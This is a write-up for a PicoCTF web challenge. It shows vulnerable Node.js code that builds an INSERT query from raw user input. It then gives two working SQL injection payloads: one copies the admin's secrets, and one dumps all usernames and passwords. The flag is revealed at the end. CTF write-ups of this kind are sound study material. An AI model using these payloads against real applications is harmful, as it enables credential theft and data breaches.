---
title: "Secret Box"
date: 2026-04-01
layout: writeup
platform: PicoCTF
categories: [Web Exploitation]
tags: [web,IDOR]
difficulty: medium
challenge link: https://play.picoctf.org/practice/challenge/750?category=1&difficulty=2&originalEvent=79&page=1
---

# Secret Box

Writeup for Secret Box challenge of PicoCTF 2026.

## Sql Injection
After creating a dummy account and logging in, we are given a "My secrets" page and "Create New Secret" tab.

On going to the "Create New Secret" tab, we get an input box to write our secrets.

Upon testing the message box for sql injection, we find it vulnerable by looking at source code and error messages.

In server.js we have-
```
const query = await db.raw(
		`INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')` 
	);
```

where the content is user input.Upon testing with incorrect syntax sql we get error messages as:
```

error: INSERT INTO secrets(owner_id, content) VALUES ('XXXour_owner_idXXX', '' SELECT username,password FROM users where user=admin OR 1=1 --') - syntax error at or near "SELECT"
    at parseErrorMessage (/challenge/node_modules/pg-protocol/dist/parser.js:305:11)
    at Parser.handlePacket (/challenge/node_modules/pg-protocol/dist/parser.js:143:27)
    at Parser.parse (/challenge/node_modules/pg-protocol/dist/parser.js:37:38)
    at Socket.<anonymous> (/challenge/node_modules/pg-protocol/dist/index.js:11:42)
    at Socket.emit (node:events:517:28)
    at addChunk (node:internal/streams/readable:368:12)
    at readableAddChunk (node:internal/streams/readable:341:9)
    at Readable.push (node:internal/streams/readable:278:10)
    at TCP.onStreamRead (node:internal/stream_base_commons:190:23)
```

This shows that we can escape the INSERT query by adding ') at the start of our input, which makes the INSERT query into:
>INSERT INTO secrets(owner_id, content) VALUES ('XXXour_owner_id'XXX,''); <then our query>

We needed a query that would insert admin's secret messages into our secret messages.

The payload used for this was:

```
'); INSERT INTO secrets(owner_id, content)
SELECT 'XXXour_owner_idXXX', content
FROM secrets
WHERE owner_id = (SELECT id FROM users WHERE username='admin'); --
```

This inserts all the secret messages of admin into our messages and we get the flag in one of the messages.

We can also get the credentials of all users into our messages using the payload:
```
'); INSERT INTO secrets(owner_id, content)
SELECT 'XXXour_owner_idXXX',
username || ':' || password
FROM users; --
```

And then we can login into admin's page to get the flag.

## Flag

<details>
  <summary>Show flag</summary>
  
  > `picoCTF{sq1_1nject10n_429d1d8c}`
</details>
